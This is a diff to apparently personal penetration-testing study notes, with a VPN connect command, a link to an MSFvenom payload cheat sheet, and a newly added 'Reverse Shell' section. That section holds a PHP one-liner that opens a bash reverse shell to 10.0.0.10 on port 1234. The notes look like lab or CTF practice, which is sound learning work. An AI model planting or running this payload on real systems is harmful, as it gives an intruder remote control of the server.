@@ -26,3 +26,10 @@ sudo openvpn --config ./Desktop/yufujioka.ovpn
 ### MSFvenom
 
 - [MSFvenom ~ ペイロード早見表 ~](https://qiita.com/mr-wacker/items/0ec926951ffa5a4d197c)
+
+### Reverse Shell
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
+```
